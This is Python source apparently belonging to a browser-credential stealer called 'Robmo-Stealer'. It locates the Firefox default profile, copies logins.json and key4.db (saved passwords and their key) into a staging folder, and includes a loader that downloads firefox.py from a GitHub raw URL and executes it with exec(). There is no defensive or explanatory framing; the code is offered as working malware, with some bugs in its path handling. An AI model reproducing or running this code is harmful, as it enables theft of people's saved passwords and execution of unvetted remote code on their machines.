import os
import requests
import getpass
import shutil

user = os.path.expanduser("~")

def get_signons(user):
    git = "https://github.com/matiasb186/Robmo-Stealer/blob/main/signons.sqlite"
    download = os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱")
    if not os.path.exists(download):
        os.mkdir(download)
    file = os.path.join(download, "signons.sqlite")
    response = requests.get(git)
    if response.status_code == 200:
        with open(file, 'wb') as file:
            file.write(response.content)
            

def fire_profile(user):
    profiles = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    
    for root, dirs, files in os.walk(profiles):
        for profile in dirs:
            if 'default-release' in profile:
                return profile
    return None

def copy(user, profile, destination):
    source = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile)
    logins = os.path.join(source, "logins.json")
    key = os.path.join(source, "key4.db")

    
    shutil.copy(logins, os.path.join(destination, "logins.json"))
    shutil.copy(key, os.path.join(destination, "key4.db"))
    
firefox_profile = fire_profile(user)

get_signons(user)

copy(user, firefox_profile, os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱"))

import os
import requests

user = os.path.expanduser("~")
download_folder = os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱")

def download_firefox_script(user):
    script_url = "https://raw.githubusercontent.com/matiasb186/Robmo-Stealer/main/firefox.py"
    script_file = os.path.join(download_folder, "firefox.py")

    response = requests.get(script_url)
    if response.status_code == 200:
        with open(script_file, 'wb') as file:
            file.write(response.content)

def execute_firefox_script():
    script_file = os.path.join(download_folder, "firefox.py")
    if os.path.exists(script_file):
        try:
            with open(script_file, 'r', encoding='utf-8') as f:
                exec(f.read())
        except Exception as e:
            print(f"Error al ejecutar firefox.py: {str(e)}")

download_firefox_script(user)

execute_firefox_script()
